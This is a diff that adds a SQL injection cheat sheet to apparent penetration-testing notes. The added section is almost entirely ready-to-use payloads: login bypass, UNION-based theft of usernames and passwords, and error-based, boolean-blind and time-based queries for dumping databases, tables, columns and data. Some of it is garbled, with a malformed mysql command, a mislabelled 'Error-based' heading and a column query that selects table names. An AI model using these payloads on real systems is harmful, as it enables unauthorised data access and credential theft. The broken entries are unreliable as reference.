@@ -286,10 +286,119 @@ https://medium.com/@Varma_Chekuri/introduction-to-azure-pentesting-2-de576dfb55b
  
  
  <br /><br />
+# SQL Injection
 
+```
+login bypass
+' OR 'a'='a
+SELECT Name, Description FROM Products WHERE ID='' OR 'a'='a';
+enumerate databases, tables and columns via terminal
+mysql -u root -p -e "SELECT schema_name FROM information_schema.schemas FROM information_schema.schemata
+mysql -u root -p -e "SELECT table_name FROM information_schema.tables WHERE table_schema='mysql'"
+mysql -u root -p -e "SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='user'
+An attacker could also exploit the UNION command by supplying:
+SELECT Name, Description FROM Products WHERE ID='' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a';
+```
+
+SQL injection cheat sheet (sqli)
+```
+@@hostname : Current Hostname
+@@tmpdir : Tept Directory
+@@datadir : Data Directory
+@@version : Version of DB
+@@basedir : Base Directory
+user() : Current User
+database() : Current Database
+version() : Version
+schema() : current Database
+UUID() : System UUID key
+current_user() : Current User
+current_user : Current User
+system_user() : Current Sustem user
+session_user() : Session user
+@@GLOBAL.have_symlink : Check if Symlink Enabled or Disabled
+@@GLOBAL.have_ssl : Check if it have ssl or not
+Normal-injection
+1 UNION ALL SELECT NULL,version()--
+Retrieve database names:
+1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata--
+Retrieve table names:
+1 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='database1'--
+Retrieve column names:
+1 UNION ALL SELECT NULL,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='table1'--
+Retrieve data:
+1 UNION ALL SELECT NULL,concat(0x28,column1,0x3a,column2,0x29) FROM table1--
+Retrieve data from another database:
+1 UNION ALL SELECT NULL,concat(0x28,column1,0x3a,column2,0x29) FROM database2.table1--
+```
+
+## Retrieve database version
+```
+1 AND extractvalue(rand(),concat(0x3a,version()))--
+Retrieve database names:
+1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 0,1)))--
+Retrieve table names:
+1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1)))--
+Retrieve column names:
+1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_NAME="table1" LIMIT 0,1)))--
+Retrieve data:
+1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(column1,0x3a,column2) FROM table1 LIMIT 0,1)))--
+Retrieve data from another database:
+1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(column1,0x3a,column2) FROM database2.table1 LIMIT 0,1)))--
+1 AND(SELECT 1 FROM(SELECT COUNT(*),concat(version(),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)--
+Retrieve database names:
+1 AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT schema_name FROM information_schema.schemata LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.schemata GROUP BY a LIMIT 0,1)b)--
+Retrieve table names:
+1 AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.TABLES GROUP BY a LIMIT 0,1)b)--
+Retrieve column names:
+1 AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="table1" LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.COLUMNS GROUP BY a LIMIT 0,1)b)--
+Retrieve data:
+1 AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT column1 FROM table1 LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)--
+Retrieve data from another database:
+1 AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT column1 FROM database2.table1 LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)--
+```
+
+## Error-based
+```
+This query should result in the original page being displayed:
+1 AND 1=1
+Whilst this query should return a different page:
+1 AND 1=2
+Retrieve version:
+1 AND (ascii(substr((SELECT version()),1,1))) > 52--
+Note, a better way to retrieve the version in this context is to use the LIKE function:
+1 AND (SELECT version()) LIKE "5%"--
+Retrieve databases:
+1 AND (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))) > 95--
+Retrieve tables:
+1 AND (ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1),1,1))) > 95--
+Retrieve columns:
+1 AND (ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="table1" LIMIT 0,1),1,1))) > 95--
+Retrieve data:
+1 AND (ascii(substr((SELECT column1 FROM table1 LIMIT 0,1),1,1))) > 95--
+Retrieve data from another database:
+1 AND (ascii(substr((SELECT column1 FROM database2.table1 LIMIT 0,1),1,1))) > 95--
+```
+## Time-Based  
+```
+1 AND sleep(10)--
+Retrieve version:
+1 AND IF((SELECT ascii(substr(version(),1,1))) > 53,sleep(10),NULL)--
+Retrieve version using LIKE:
+1 AND IF((SELECT version()) LIKE "5%",sleep(10),NULL)--
+Retrieve databases:
+1 AND IF(((ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)))) > 95,sleep(10),NULL)--
+Retrieve tables:
+1 AND IF(((ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1),1,1))))> 95,sleep(10),NULL)--
+Retrieve columns:
+1 AND IF(((ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="table1" LIMIT 0,1),1,1)))) > 95,sleep(10),NULL)--
+Retrieve data:
+1 AND IF(((ascii(substr((SELECT column1 FROM table1 LIMIT 0,1),1,1)))) > 95,sleep(10),NULL)--
+Retrieve data from another database:
+1 AND IF(((ascii(substr((SELECT column1 FROM database1.table1 LIMIT 0,1),1,1)))) >95,sleep(10),NULL)--
+```
 
 # Passwords
-
 
 
 ## Password Cracking
